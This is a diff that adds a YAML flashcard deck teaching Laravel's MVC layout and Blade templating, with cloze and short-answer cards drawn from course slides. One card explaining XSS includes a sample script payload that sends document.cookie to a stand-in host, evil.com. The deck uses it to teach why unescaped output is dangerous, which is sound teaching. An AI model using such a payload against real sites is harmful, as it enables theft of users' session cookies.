@@ -1,0 +1,113 @@
+- id: laravel-mvc-blade
+  name: "MVC and Blade Templating"
+  tags: [laravel, mvc, blade, views]
+  prose: "Laravel enforces MVC separation through opinionated directory conventions. Blade is the PHP templating engine built into Laravel — it replaces raw PHP in views with @-directives and the double-brace syntax for XSS-safe output."
+  cards:
+
+    - id: mvc-blade-card-01
+      type: cloze
+      prompt: "In Laravel's MVC layout, controllers live in {{app/Http/Controllers/}}, models in {{app/Models/}}, and views in {{resources/views/}}."
+      answer: "app/Http/Controllers/, app/Models/, resources/views/"
+      explanation: "Laravel is opinionated — putting code in the wrong directory causes the framework not to find it. The directory layout enforces MVC role separation at the filesystem level."
+      example: "A `UserController.php` in `app/Http/Controllers/` calls `User::all()` from `app/Models/User.php` and returns `view('users.index', compact('users'))`."
+      source: "intro_to_laravel.pptx slide 3"
+      bloom: remember
+
+    - id: mvc-blade-card-02
+      type: name
+      prompt: "What @-directive marks the injection point in a Blade parent layout where a child view's content will be inserted?"
+      answer: "@yield('name')"
+      explanation: "@yield is the slot declaration in the parent. It pairs with @section in the child. The string argument names the slot and must match exactly on both sides."
+      example: "Parent: `@yield('content')`. Child: `@section('content') <h1>Hello</h1> @endsection`."
+      source: "intro_to_laravel.pptx slides 18–19"
+      bloom: remember
+
+    - id: mvc-blade-card-03
+      type: cloze
+      prompt: "A child Blade view uses {{@extends('layouts.master')}} to inherit a layout and {{@section('content')}} ... {{@endsection}} to define its content block."
+      answer: "@extends('layouts.master'), @section('content'), @endsection"
+      explanation: "@extends triggers layout loading. @section opens the named block. @endsection closes it. Omitting @endsection causes a Blade parse error."
+      example: "`@extends('layouts.master')` loads `resources/views/layouts/master.blade.php`."
+      source: "intro_to_laravel.pptx slides 18–19; intro_to_laravel_SCRIPT.docx §Creating your own blade template"
+      bloom: remember
+
+    - id: mvc-blade-card-04
+      type: name
+      prompt: "Which double-brace syntax escapes HTML entities and is therefore XSS-safe — `{{ $var }}` or `{!! $var !!}`?"
+      answer: "{{ $var }}"
+      explanation: "`{{ }}` calls htmlspecialchars() internally, converting `<`, `>`, and `&` to HTML entities. `{!! !!}` outputs raw HTML and bypasses this protection entirely."
+      example: "`{{ \"<script>alert('xss')</script>\" }}` renders as visible text. `{!! \"<script>alert('xss')</script>\" !!}` executes the script."
+      source: "intro_to_laravel.pptx slide 25"
+      bloom: understand
+
+    - id: mvc-blade-card-05
+      type: cloze
+      prompt: "Using {{'{!! $userInput !!}'}} without sanitizing $userInput creates an {{XSS}} vulnerability because Blade outputs the value as {{raw HTML}}."
+      answer: "{!! $userInput !!}, XSS, raw HTML"
+      explanation: "XSS (cross-site scripting) lets attackers inject script tags that run in the victim's browser. Blade's `{{ }}` prevents this by escaping output. `{!! !!}` is opt-in and requires you to own or sanitize the content first."
+      example: "An attacker sets their username to `<script>fetch('evil.com?c='+document.cookie)</script>`. Rendering it with `{!! $user->name !!}` sends the user's cookies to the attacker."
+      source: "intro_to_laravel.pptx slide 25; intro_to_laravel_SCRIPT.docx §Cross site scripting attack protection"
+      bloom: understand
+
+    - id: mvc-blade-card-06
+      type: name
+      prompt: "Which @-directive embeds a reusable Blade template fragment (a partial view) at a given location in another Blade file?"
+      answer: "@include('path.to.partial')"
+      explanation: "@include inserts the partial view inline. The partial view receives all variables currently in scope. Dot-notation maps to the directory path under `resources/views/`."
+      example: "`@include('partials.header')` loads `resources/views/partials/header.blade.php`."
+      source: "intro_to_laravel.pptx slide 20; intro_to_laravel_SCRIPT.docx §Partial views"
+      bloom: remember
+
+    - id: mvc-blade-card-07
+      type: predict
+      lang: blade
+      prompt: "What does this Blade snippet output if $id is 5?"
+      code: |
+        @if($id == 5)
+            <p>Secret!</p>
+        @endif
+        <ul>
+            @foreach(['a','b'] as $item)
+                <li>{{ $item }}</li>
+            @endforeach
+        </ul>
+      answer: "Outputs `<p>Secret!</p>` followed by an unordered list with items `a` and `b`. When $id is not 5, the paragraph is omitted."
+      explanation: "@if evaluates the condition and renders its block only when true. @foreach iterates the array. {{ }} escapes each value before rendering."
+      source: "intro_to_laravel.pptx slide 22; intro_to_laravel_SCRIPT.docx §Control structures"
+      bloom: apply
+
+    - id: mvc-blade-card-08
+      type: cloze
+      prompt: "The Blade component `<x-master>` maps to the file {{resources/views/components/master.blade.php}}, and named slots use the syntax {{<x-slot name='content'>}}."
+      answer: "resources/views/components/master.blade.php, <x-slot name='content'>"
+      explanation: "Blade components are the modern equivalent of @extends/@section. The `x-` prefix is the component tag convention. Named slots allow multiple injection points in one component."
+      example: "Inside the component file, `{{ $content }}` renders the slot — not `@yield('content')`."
+      source: "TIDBITS-components_config_db_SCRIPT.docx §Blade Components"
+      bloom: understand
+
+    - id: mvc-blade-card-09
+      type: name
+      prompt: "In a Blade component file, how do you render the content passed via `<x-slot name='content'>`?"
+      answer: "{{ $content }}"
+      explanation: "Blade components pass each named slot as a PHP variable. The slot name becomes the variable name. This differs from the @yield pattern used in layout inheritance."
+      example: "Component file: `<div class='container'>{{ $content }}</div>`. Caller: `<x-master><x-slot name='content'>Hello</x-slot></x-master>`."
+      source: "TIDBITS-components_config_db_SCRIPT.docx §Blade Components"
+      bloom: apply
+
+    - id: mvc-blade-card-10
+      type: name
+      prompt: "In Laravel MVC, which layer is responsible for querying the database — the Model, the View, or the Controller?"
+      answer: "Model"
+      explanation: "The View renders HTML only; it receives data from the controller. The Controller coordinates work but delegates data access to the Model. Mixing database calls into views breaks MVC separation and makes code hard to test."
+      example: "Controller: `$users = User::all(); return view('users.index', compact('users'));`. The view receives `$users` as a variable — it never calls the database."
+      source: "intro_to_laravel.pptx slides 3–5"
+      bloom: understand
+
+    - id: mvc-blade-card-11
+      type: cloze
+      prompt: "A Blade comment uses the syntax {{'{{'}}{{-- ... --}}{{'}}'}} and is {{not sent to the browser}} in the compiled HTML output."
+      answer: "{{-- ... --}}, not sent to the browser"
+      explanation: "HTML comments (`<!-- -->`) are visible in page source. Blade comments (`{{-- --}}`) are stripped at compile time and never reach the browser — useful for notes that should not be public."
+      example: "`{{-- TODO: remove this before production --}}` leaves no trace in the rendered HTML."
+      source: "intro_to_laravel.pptx slide 24; intro_to_laravel_SCRIPT.docx §Comments in view blades"
+      bloom: remember
